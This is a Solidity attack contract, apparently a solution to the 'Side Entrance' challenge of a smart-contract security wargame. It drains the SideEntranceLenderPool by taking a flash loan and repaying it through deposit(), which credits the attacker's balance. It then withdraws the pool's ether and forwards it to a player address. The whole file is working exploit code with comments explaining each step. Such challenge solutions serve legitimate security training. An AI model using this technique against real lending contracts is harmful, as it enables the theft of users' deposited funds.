// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import { SideEntranceLenderPool, IFlashLoanEtherReceiver } from "../side-entrance/SideEntranceLenderPool.sol";


contract HackSideEntrance is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;
    address player;

    constructor(SideEntranceLenderPool _pool, address _player) {
        pool = _pool;
        player = _player;
    }

    function flashLoan(uint amount) public payable {
        // We're going to call the flashLoan function
        pool.flashLoan(amount);
        // Withdraw the balance you save with the execute function
        pool.withdraw();
        // Then, transfer the value to the player
        player.call{value: address(this).balance}("");
    }

    function execute() external payable {
        // In order to return the loan, we're going to make a deposit
        // If you make a deposit you're returning the amount borrowed
        // And at the same time you're saving a positive balance for yourself
        pool.deposit{value: msg.value}();
    }

    // You need a fallback payable function in order to withdraw
    fallback() external payable { }
}